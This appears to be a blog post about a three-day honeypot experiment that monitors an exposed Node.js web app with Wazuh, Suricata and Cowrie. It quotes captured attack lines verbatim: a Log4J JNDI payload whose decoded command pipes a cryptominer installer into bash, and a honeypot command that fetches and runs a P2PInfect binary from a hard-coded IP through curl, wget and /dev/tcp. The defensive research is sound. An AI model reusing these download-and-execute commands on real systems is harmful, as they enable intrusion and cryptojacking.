## Blog Post Title From First Header

During Christmas holiday, I was reviewing my Github account and I found a funny web applications that I developed for an universitary course. It's Meme Generator, which obviosly allow user to see communicaty-created meme and, if registered, to create its own memes.
Being an introductory course on web application development, security was unfortunately out-of-scope. I start thinking what could happen if I would expose the app on Internet. Would hackers be interested on breaking it? Would they be able to do that? Would they be able to find it in the very first place?
Let's try it.
Beside the application, I needed:
- A way to understand if something strange is happening on my web server.
- I would like to know what kind of requests reach it.
- A software to centralize all these information.

I found out that Wazuh can satisfy both point 1. and 3. Wazuh is an open-source XDR and SIEM solutions: this means that the agent can monitor the endpoint where application is hosted and figure out if some malicious actions is taking place; moreover the SIEM can collect telemetry data for future analysis.
Regarding point 2. I decided to use Suricata which is a IDS/IPS solution, therefore can help me to understand if some strange requests is hitting the server. Finally, I forwarded Suricata alerts to Wazuh SIEM.

I didn't plan to use an SSH honeypot in the first place, but after some trials, I thought it may be a good idea to make the server more attractive for the bad guys. After trying a bunch of open-source projects, I went with Cowrie.

(All artifacts and tool configurations can be found on the repo: )

### Infrastructure Design
I used cloud provider to setup 2 VMs: the first one hosted the web server and it is equipped with Wazuh agent, which monitor the system. Moreover, Suricata has been installed and setup to alert if web server is asked for weird content. Obviously, this one is Internet facing.
A second VM serves to host Wazuh console, which allow me to check alert and collect logs sent by the web-server. It is not internet-facing.
Comunnications between the VMs was filtered by the cloud-provider's firewall: in fact, it only permits the web-server to communicate with Wazuh console. This would avoid an attacker to reach also my central console.

### Web-app Setup
The application is very simple. It has been written mainly in Javascript, using a nodeJS server written in ExpressJS.

### Wazuh Setup
In this test, I deployed Wazuh agent on the web server and Wazuh console. Basically, the agent monitor the hosts, looking for suspicious actions and sends notifications to Wazuh console. Wazuh offers different features to detect malicious actions, but it needs to be properly configured.
Among the different features that can be enabled on Wazuh, I decide to try out the following:
1. File Integroty Monitoring: features that checks some folder/file for changes. It is useful to figure out if sensitive folders has been hacked. Among the common folder (/usr, /bin, /etc), I included also the folder where Cowrie drop files downloaded by user connected via SSH.
2. Integration with VirusTotal: VirusTotal is ... . I used the API key provided with free account to connect Wazuh with VirusTotal. This feature allows to automatically scan monitored folders once a change occurs. 
3. Enable hidden process detection: it allows to detects hidden processes created by rootkit.

In addition, I decide to send to SIEM logs from additional sources:
1. access.log: logs from ExpressJS server. Here I decided to raise the priority of default rules to be alerted on every requests again the the server.
2. cowrie.log: logs from honeypot. Since I would have like to be notified on every suspicious commands or login attempts, I looked at some log entry and construct a couple of rule on Wazuh to be alerted whenever a login attempts or any commands is executed
3. eve.log: logs from Suricata. The alerts from Suricata are automatically sent to dashboard's alerts thanks to predefined rules.

Finally, every configuration has been set to just monitor and alert and avoid blocking malicious actions: in fact, I would like to see how far an attacker could go with webserver configurations.
The configuration is far from being exhaustive but I thought it is enough to understand if some malicious actions is occurring. 

### Suricata Setup
I installed Suricata on the server which raise an alert (then forwarded to Wazuh SIEM) based on a predefined set of rules. I decided to use the "Emerging threats" ruleset (https://community.emergingthreats.net) as recommended by many.

### SSH honeypot Setup
Cowrie is a medium to high interaction SSH honeypot design to emulate UNIX systems and log every actions. It has been written in Python and offers more features than the ones that I tried (for example, it's also a Telnet honeypot).
Even it works enough good "out-of-the-box", allowing to log actions and retrieve files dropped in the fake system, I found the documentation a bit lacky and unclear on some topics.
Cowrie is available in a dockerized version, which make it even more easier to be used. After running the container and forwarding the traffic, it immeatialy starts to log.
I decide to set it up in order to allow login with any username/password after a few login attemps.

### Results
After setting everything up, it's time to run it and wait for results. I run it for about 72 hours.
Despite I would expected more iteractions with the application, actually some strange requests and command has been launch against the server. I believe that most of them were conducted by automatized bots, but I'm quite happy with that anyway.
Here some generals statistics collected with the SIEM.

![Most used commands in the honeypot][img/2024-01-09-Wazuh-and-Honeypot/command.png]

Here the categorization of malicious traffics given by Suricata. I find some of them interesting:
- Attempted Administrator Privilege Gain. From Suricata it seems to be alerting against CVE_2018_11776. Details here: https://www.keysight.com/blogs/en/tech/nwvs/2022/06/03/strutting-to-remote-code-execution-anatomy-of-cve-2018-11776
- Attempted User Privilege Gain. Even if detection is different, it seems to have the same aim (la prima appartiene a questo ruleset https://github.com/jpalanco/alienvault-ossim/blob/master/snort-rules-default-open/rules/2.9.2/emerging.rules/emerging-exploit.rules)

There's has been also an attempt to drop a cryptominer via Log4J attack. On Christmas day, at 15:58 (Rome time) I receive the following request against the web server: (interessante sapere se è stato rilevato da Suricata, anche se encoded)
```
GET / HTTP/1.1" 200 3230 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//cdn.x4b.lol:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//cdn.x4b.lol:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}')"
```

Decoding base64 string, I got:
```
curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 486xqw7ysXdKw7RkVzT5tdSiDtE6soxUdYaGaGE1GoaCdvBF7rVg5oMXL9pFx3rB1WUCZrJvd6AHMFWipeYt5eFNUx9pmGN
```

(https://blog.criminalip.io/2022/02/11/criminal-ip-analysis-report-on-log4j-attack-patterns/)

"Unfortunately", I didn't use log4j and the attack didn't go well. Anyway, from the decoding string, it is possible to notice that the aim of the attack is to download "xmrig_setup", an opensource miner, and sent crypto to the attacker's wallet.

As soon as I was loosing any hope to get something interesting, a curl command was launch in the honeypot:
```
curl http://74.208.103.29:60116/linux -o /tmp/hhXx6VBudz; if [ ! -f /tmp/hhXx6VBudz ]; then wget http://74.208.103.29:60116/linux -O /tmp/hhXx6VBudz; fi; if [ ! -f /tmp/hhXx6VBudz ]; then exec 6<>/dev/tcp/74.208.103.29/60116 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/hhXx6VBudz && chmod +x /tmp/hhXx6VBudz && /tmp/hhXx6VBudz amUKy2H88jbv/3/NEHQcGX8IzH7/+CD2+mHODn0FGnUN0n33+zbx/37KHnEYBXQLymH/+S74+3XKDnQfHmUPxX/g8DTv/X3SB3ERHXUPyHbu9TPv/3rJEHQcE2sNxHX48THw/W/IDWsaGHEQznz87zj7+H/NDHALGHIQznz57zby4HrEBHMbGncH3Hn/7zH3/mHOD3YFGXYHxnn+8DL07nfSDHQTBXcNzGH/9DL7+H/ND3MLHXQQzXr67zHy9mHNDnIRHXUPyH3u8Dj04HjEEHQYGGsMz3/09zDw+nvcD3cYBXQLy2H5+C7y+nXKDnQfEmUKy2H/8TDv/WHOC3YRHXUPzH/u9TPv/3rJEHQdEmsLyXX48TH1/W/OD3QFGn0O0n3/+C7z/HvGCHUaG3Ieyn7g8DX24H7LCWsZGXwEyn//8jTh/3/EEHQTGmsPzn3g8zLw9HnMD3UaC3EL0n79+S7w+XvSD3wSEXMOzX754TL24H3ODWsZGGsIzXX48THz/m/ND3wFGn0G0n74+S7w+nrGCHUaH3EezX//7zP14H3PCGsaHncEyn//9Tfh/HzSB3EFGXYL0nf09zDw/HzcD3IbBXQOymH/9jTv/3jNBHMbGnUN3H388S7w+XbSD3wTBXcLxnn+8DH07nzLEHcYHGsMzHrg+DD7+H/NDHULE2sMzXjg8DTz4H7LCn8dG3QNyG/88zHv/3/SD3cfBXQKznX48THz+2/ED2sZGnEQzXz67zH09nXKDnQfE2UPzXbg8DPv9nfSDHEbEXMOzX/34TLz/mHNCHQFGncM0n3/8Tr3/n7OCxu4ApTkr8lQCGGraDz9MHV6; fi; echo password > /tmp/.opass; chmod +x /tmp/hhXx6VBudz && /tmp/hhXx6VBudz amUKy2H88jbv/3/NEHQcGX8IzH7/+CD2+mHODn0FGnUN0n33+zbx/37KHnEYBXQLymH/+S74+3XKDnQfHmUPxX/g8DTv/X3SB3ERHXUPyHbu9TPv/3rJEHQcE2sNxHX48THw/W/IDWsaGHEQznz87zj7+H/NDHALGHIQznz57zby4HrEBHMbGncH3Hn/7zH3/mHOD3YFGXYHxnn+8DL07nfSDHQTBXcNzGH/9DL7+H/ND3MLHXQQzXr67zHy9mHNDnIRHXUPyH3u8Dj04HjEEHQYGGsMz3/09zDw+nvcD3cYBXQLy2H5+C7y+nXKDnQfEmUKy2H/8TDv/WHOC3YRHXUPzH/u9TPv/3rJEHQdEmsLyXX48TH1/W/OD3QFGn0O0n3/+C7z/HvGCHUaG3Ieyn7g8DX24H7LCWsZGXwEyn//8jTh/3/EEHQTGmsPzn3g8zLw9HnMD3UaC3EL0n79+S7w+XvSD3wSEXMOzX754TL24H3ODWsZGGsIzXX48THz/m/ND3wFGn0G0n74+S7w+nrGCHUaH3EezX//7zP14H3PCGsaHncEyn//9Tfh/HzSB3EFGXYL0nf09zDw/HzcD3IbBXQOymH/9jTv/3jNBHMbGnUN3H388S7w+XbSD3wTBXcLxnn+8DH07nzLEHcYHGsMzHrg+DD7+H/NDHULE2sMzXjg8DTz4H7LCn8dG3QNyG/88zHv/3/SD3cfBXQKznX48THz+2/ED2sZGnEQzXz67zH09nXKDnQfE2UPzXbg8DPv9nfSDHEbEXMOzX/34TLz/mHNCHQFGncM0n3/8Tr3/n7OCxu4ApTkr8lQCGGraDz9MHV6 &
```


The first thing that come up to my eyes is the rendundacy of the script trying to download the file with "curl", "wget" and using lower-level methods: likely to overcome difficult of finding the tool on the system or avoid detections.
After downloading the script, it write the string "password" in a file under /tmp and execute the script with the argument "amUKy2H88jbv/3/NEHQcGX8IzH7/+CD2+mHODn0FGnUN0n33+zbx/37KHnEYBXQLymH/+S74+3XKDnQfHmUPxX/g8DTv/X3SB3ERHXUPyHbu9TPv/3rJEHQcE2sNxHX48THw/W/IDWsaGHEQznz87zj7+H/NDHALGHIQznz57zby4HrEBHMbGncH3Hn/7zH3/mHOD3YFGXYHxnn+8DL07nfSDHQTBXcNzGH/9DL7+H/ND3MLHXQQzXr67zHy9mHNDnIRHXUPyH3u8Dj04HjEEHQYGGsMz3/09zDw+nvcD3cYBXQLy2H5+C7y+nXKDnQfEmUKy2H/8TDv/WHOC3YRHXUPzH/u9TPv/3rJEHQdEmsLyXX48TH1/W/OD3QFGn0O0n3/+C7z/HvGCHUaG3Ieyn7g8DX24H7LCWsZGXwEyn//8jTh/3/EEHQTGmsPzn3g8zLw9HnMD3UaC3EL0n79+S7w+XvSD3wSEXMOzX754TL24H3ODWsZGGsIzXX48THz/m/ND3wFGn0G0n74+S7w+nrGCHUaH3EezX//7zP14H3PCGsaHncEyn//9Tfh/HzSB3EFGXYL0nf09zDw/HzcD3IbBXQOymH/9jTv/3jNBHMbGnUN3H388S7w+XbSD3wTBXcLxnn+8DH07nzLEHcYHGsMzHrg+DD7+H/NDHULE2sMzXjg8DTz4H7LCn8dG3QNyG/88zHv/3/SD3cfBXQKznX48THz+2/ED2sZGnEQzXz67zH09nXKDnQfE2UPzXbg8DPv9nfSDHEbEXMOzX/34TLz/mHNCHQFGncM0n3/8Tr3/n7OCxu4ApTkr8lQCGGraDz9MHV6".
I'm not quite familiar with malware analysis, but I was very curious to understand what the script does.
First thing, I decided to use "Hybrid Analysis" to get some clues. The results that can found here https://www.hybrid-analysis.com/sample/1e2686c1a674630311fdab9b74df54605309076b6d2c3acb4dbc0e7c0080bfa4?environmentId=310. The list of MITRE ATT&CK techniques recognized are briefly:

1. T1106: Adversarie interact with native OS.
2. T1027: Obfuscated File or information: section header missing, binary statically linked.
3. T1497: Sandbox evasion.
4. T1480: Execution Guardrails.
5. T1018: Attempt to get a listing  of other systems.
6. T1003.008: Credential Access.
7. T1071: Attempt to communicate.
8. T1573: Employ encryption algorith.

Ok, it may be useful but it still unclear the final goal of the script.

I used "readelf" utility to get some static property of the files but it seems to be statically linked and stripped; it may not be so informative as I thought.
In addition, a further scan with VirusTotal seems to categorize it as a "P2PInfect" malware: in a few words it's a malware which exploit a Redis vulnerability and then drop executable needed to join the host on a P2P network. Once joined, additional payloads are downloaded based on OS.(here a good explanation from Palo Alto Unit42: https://unit42.paloaltonetworks.com/peer-to-peer-worm-p2pinfect/).
Out of curiosity, I setup a new VMs to investigate a little further and I started trace out syscall with "strace" (full output on Github). There are tons of suspicious calls like reading "/etc/shadow" and "/etc/passwd" or open new connections.
About connections, looking at firewall logs (every inbound/outbound connections was blocked). I noticed that it started contacting different IP addresses (maybe other P2P nodes as Unit 42 article state)

After some research, I decided that this work require tons of time and ability, therefore I'll write a new post with a proper analysis.

#### Conclusions
At the beginning, I had in mind different scenarios in which hackers would try to break my applications and reach the database. Instead I got a lot of likely bot-driven traffic and hacking attempts. At the end, it's also true that no hackers would have spent a lot of time breaking an application which probably doesn't worth it.
Also, running the VMs for just 3 days didn't help.
Anyway, I'm quite satisfied with the results, expecially with the proably "P2PInfect" malware which I look forward to analyze. Moreover, I really appreciate having the chance to use Wazuh which I would like to try for months.

---

